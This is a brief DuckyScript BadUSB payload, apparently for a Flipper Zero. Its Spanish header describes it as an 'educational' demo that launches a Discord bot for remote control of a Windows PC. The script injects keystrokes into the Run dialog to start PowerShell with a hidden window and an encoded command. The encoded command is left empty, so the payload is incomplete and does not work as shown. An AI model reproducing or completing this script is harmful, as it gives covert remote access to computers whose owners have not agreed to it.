
REM Title: FlipperBot - Demo Educativa de Bot de Discord
REM Author: demo
REM Description: Lanza un bot de Discord que permite control remoto educativo de la PC.
REM Target: Windows 10/11
REM Keyboard: en-US (via Win+R Run Dialog)

DEFAULT_DELAY 100

DELAY 1000
GUI r
DELAY 750
STRING powershell -NoP -W H -EncodedCommand 
ENTER
